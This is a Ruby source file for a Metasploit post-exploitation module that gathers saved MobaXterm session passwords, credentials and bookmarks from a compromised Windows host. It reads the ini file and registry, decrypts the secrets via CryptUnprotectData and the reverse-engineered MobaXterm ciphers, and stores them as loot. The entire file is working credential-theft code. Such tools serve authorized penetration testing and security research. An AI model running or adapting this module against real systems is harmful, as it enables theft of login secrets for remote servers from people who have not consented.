##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#
# @blurbdust based this code off of https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb
# and https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/enum_ms_product_keys.rb
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather MobaXterm Passwords',
        'Description' => %q{
          This module will determine if MobaXterm is installed on the target system and, if it is, it will try to
          dump all saved session information from the target. The passwords for these saved sessions will then be decrypted
          where possible, using the decryption information that HyperSine reverse engineered.
        },
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://blog.kali-team.cn/Metasploit-MobaXterm-0b976b993c87401598be4caab8cbe0cd' ]
        ],
        'Author' => ['Kali-Team <kali-team[at]qq.com>'],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_railgun_api
              stdapi_railgun_api_multi
              stdapi_railgun_memread
              stdapi_railgun_memwrite
              stdapi_sys_process_get_processes
            ]
          }
        }
      )
    )
    register_options(
      [
        OptString.new('MASTER_PASSWORD', [ false, 'If you know the password, you can skip decrypting the master password. If not, it will be decrypted automatically']),
        OptString.new('CONFIG_PATH', [ false, 'Specifies the config file path for MobaXterm']),
      ]
    )
  end

  def windows_unprotect(entropy, data)
    begin
      pid = session.sys.process.getpid
      process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)

      # write entropy to memory
      emem = process.memory.allocate(128)
      process.memory.write(emem, entropy)
      # write encrypted data to memory
      mem = process.memory.allocate(128)
      process.memory.write(mem, data)

      #  enumerate all processes to find the one that we're are currently executing as,
      #  and then fetch the architecture attribute of that process by doing ["arch"]
      #  to check if it is an 32bits process or not.
      if session.sys.process.each_process.find { |i| i['pid'] == pid }['arch'] == 'x86'
        addr = [mem].pack('V')
        len = [data.length].pack('V')

        eaddr = [emem].pack('V')
        elen = [entropy.length].pack('V')

        ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 8)
        len, addr = ret['pDataOut'].unpack('V2')
      else
        # Convert using rex, basically doing: [mem & 0xffffffff, mem >> 32].pack("VV")
        addr = Rex::Text.pack_int64le(mem)
        len = Rex::Text.pack_int64le(data.length)

        eaddr = Rex::Text.pack_int64le(emem)
        elen = Rex::Text.pack_int64le(entropy.length)

        ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 16)
        p_data = ret['pDataOut'].unpack('VVVV')
        len = p_data[0] + (p_data[1] << 32)
        addr = p_data[2] + (p_data[3] << 32)
      end
      return '' if len == 0

      return process.memory.read(addr, len)
    rescue Rex::Post::Meterpreter::RequestError => e
      vprint_error(e.message)
    end
    return ''
  end

  def key_crafter(config)
    if !config['SessionP'].empty? && !config['SessionP'].nil?
      s1 = config['SessionP']
      s1 += s1 while s1.length < 20
      key_space = [s1.upcase, s1.upcase, s1.downcase, s1.downcase]
      key = '0d5e9n1348/U2+67'.bytes
      for i in (0..key.length - 1)
        b = key_space[(i + 1) % key_space.length].bytes[i]
        if !key.include?(b) && '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/'.include?(b)
          key[i] = b
        end
      end
      return key
    end
  end

  def mobaxterm_decrypt(ciphertext, key)
    ct = ''.bytes
    ciphertext.each_byte do |c|
      ct << c if key.include?(c)
    end
    if ct.length.even?
      pt = ''.bytes
      (0..ct.length - 1).step(2) do |i|
        l = key.index(ct[i])
        key = key[0..-2].insert(0, key[-1])
        h = key.index(ct[i + 1])
        key = key[0..-2].insert(0, key[-1])
        next if l == -1 || h == -1

        pt << (16 * h + l)
      end
      pp pt.pack('c*')
    end
  end

  def mobaxterm_crypto_safe(ciphertext, config)
    return nil if ciphertext.nil? || ciphertext.empty?

    iv = ("\x00" * 16)
    master_password = datastore['MASTER_PASSWORD'] || ''
    sesspass = config['Sesspass']["#{config['Sesspass']['LastUsername']}@#{config['Sesspass']['LastComputername']}"]
    data_ini = Rex::Text.decode_base64('AQAAANCMnd8BFdERjHoAwE/Cl+s=') + Rex::Text.decode_base64(sesspass)
    key = Rex::Text.decode_base64(windows_unprotect(config['SessionP'], data_ini))[0, 32]
    # Use the set master password only when using the specified path
    if !master_password.empty? && datastore['CONFIG_PATH']
      key = OpenSSL::Digest::SHA512.new(master_password).digest[0, 32]
    end
    aes = OpenSSL::Cipher.new('AES-256-ECB').encrypt
    aes.key = key
    new_iv = aes.update(iv)
    # segment_size = 8
    new_aes = OpenSSL::Cipher.new('AES-256-CFB8').decrypt
    new_aes.key = key
    new_aes.iv = new_iv
    aes.padding = 0
    padded_plain_bytes = new_aes.update(Rex::Text.decode_base64(ciphertext))
    padded_plain_bytes << new_aes.final
    return padded_plain_bytes
  end

  def gather_password(config)
    result = []
    if config['PasswordsInRegistry'] == '1'
      parent_key = "#{config['RegistryKey']}\\P"
      return if !registry_key_exist?(parent_key)

      registry_enumvals(parent_key).each do |connect|
        username, server_host = connect.split('@')
        protocol, username = username.split(':') if username.include?(':')
        password = registry_getvaldata(parent_key, connect)
        key = key_crafter(config)
        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password, config)
        result << {
          protocol: protocol,
          server_host: server_host,
          username: username,
          password: plaintext
        }
      end
    else
      config['Passwords'].each_key do |connect|
        username, server_host = connect.split('@')
        protocol, username = username.split(':') if username.include?(':')
        password = config['Passwords'][connect]
        key = key_crafter(config)
        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password, config)
        result << {
          protocol: protocol,
          server_host: server_host,
          username: username,
          password: plaintext
        }
      end
    end
    result
  end

  def gather_creds(config)
    result = []
    if config['PasswordsInRegistry'] == '1'
      parent_key = "#{config['RegistryKey']}\\C"
      return if !registry_key_exist?(parent_key)

      registry_enumvals(parent_key).each do |name|
        username, password = registry_getvaldata(parent_key, name).split(':')
        key = key_crafter(config)
        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password, config)
        result << {
          name: name,
          username: username,
          password: plaintext
        }
      end
    else
      config['Credentials'].each_key do |name|
        username, password = config['Credentials'][name].split(':')
        key = key_crafter(config)
        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password, config)
        result << {
          name: name,
          username: username,
          password: plaintext
        }
      end
    end

    result
  end

  def parser_ini(ini_config_path)
    valuable_info = {}
    if session.fs.file.exist?(ini_config_path)
      file_contents = read_file(ini_config_path)
      if file_contents.nil? || file_contents.empty?
        print_warning('Configuration file content is empty')
        return
      else
        config = Rex::Parser::Ini.from_s(file_contents)
        valuable_info['PasswordsInRegistry'] = config['Misc']['PasswordsInRegistry'] || '0'
        valuable_info['SessionP'] = config['Misc']['SessionP'] || 0
        valuable_info['Sesspass'] = config['Sesspass'] || nil
        valuable_info['Passwords'] = config['Passwords'] || {}
        valuable_info['Credentials'] = config['Credentials'] || {}
        valuable_info['Bookmarks'] = config['Bookmarks'] || nil
        return valuable_info
      end
    else
      print_warning('Could not find the config path for the MobaXterm. Ensure that MobaXterm is installed on the target.')
      return false
    end
  end

  def parse_bookmarks(bookmarks)
    result = []
    protocol_hash = { '#109#0' => 'ssh', '#98#1' => 'telnet', '#128#5' => 'vnc', '#140#7' => 'sftp', '#130#6' => 'ftp', '#100#2' => 'rsh', '#91#4' => 'rdp' }
    bookmarks.each_key do |key|
      next if key.eql?('ImgNum') || key.eql?('SubRep') || bookmarks[key].empty?

      bookmarks_split = bookmarks[key].strip.split('%')
      if protocol_hash.include?(bookmarks_split[0])
        protocol = protocol_hash[bookmarks_split[0]]
        server_host = bookmarks_split[1]
        port = bookmarks_split[2]
        username = bookmarks_split[3]
        result << { name: key, protocol: protocol, server_host: server_host, port: port, username: username }
      else
        print_warning("Parsing is not supported: #{bookmarks[key].strip}")
      end
    end
    return result
  end

  def entry(config)
    pws_result = gather_password(config)
    creds_result = gather_creds(config)
    bookmarks_result = parse_bookmarks(config['Bookmarks'])
    return pws_result, creds_result, bookmarks_result
  end

  def run
    pw_tbl = Rex::Text::Table.new(
      'Header' => 'MobaXterm Password',
      'Columns' => [
        'Protocol',
        'Hostname',
        'Username',
        'Password',
      ]
    )
    bookmarks_tbl = Rex::Text::Table.new(
      'Header' => 'MobaXterm Bookmarks',
      'Columns' => [
        'BookmarksName',
        'Protocol',
        'ServerHost',
        'Port',
        'Credentials or Passwords',
      ]
    )
    creds_tbl = Rex::Text::Table.new(
      'Header' => 'MobaXterm Credentials',
      'Columns' => [
        'CredentialsName',
        'Username',
        'Password',
      ]
    )
    print_status("Gathering MobaXterm session information from #{sysinfo['Computer']}")
    ini_config_path = datastore['CONFIG_PATH'] || "#{registry_getvaldata("HKU\\#{session.sys.config.getsid}\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", 'Personal')}\\MobaXterm\\MobaXterm.ini"
    print_status("Specifies the config file path for MobaXterm #{ini_config_path}")
    config = parser_ini(ini_config_path)
    unless config
      return
    end

    parent_key = "HKEY_USERS\\#{session.sys.config.getsid}\\Software\\Mobatek\\MobaXterm"
    config['RegistryKey'] = parent_key
    pws_result, creds_result, bookmarks_result = entry(config)
    pws_result.each do |item|
      pw_tbl << item.values
    end
    bookmarks_result.each do |item|
      bookmarks_tbl << item.values
    end
    creds_result.each do |item|
      creds_tbl << item.values
    end

    if pw_tbl.rows.count > 0
      path = store_loot('host.moba_xterm', 'text/plain', session, pw_tbl, 'moba_xterm.txt', 'MobaXterm Password')
      print_good("Passwords stored in: #{path}")
      print_good(pw_tbl.to_s)
    end
    if creds_tbl.rows.count > 0
      path = store_loot('host.moba_xterm', 'text/plain', session, creds_tbl, 'moba_xterm.txt', 'MobaXterm Credentials')
      print_good("Credentials stored in: #{path}")
      print_good(creds_tbl.to_s)
    end
    if bookmarks_tbl.rows.count > 0
      path = store_loot('host.moba_xterm', 'text/plain', session, bookmarks_tbl, 'moba_xterm.txt', 'MobaXterm Bookmarks')
      print_good("Bookmarks stored in: #{path}")
      print_good(bookmarks_tbl.to_s)
    end
    if pw_tbl.rows.count == 0 && creds_tbl.rows.count == 0 && bookmarks_tbl.rows.count == 0
      print_error("I can't find anything!")
    end
  end
end
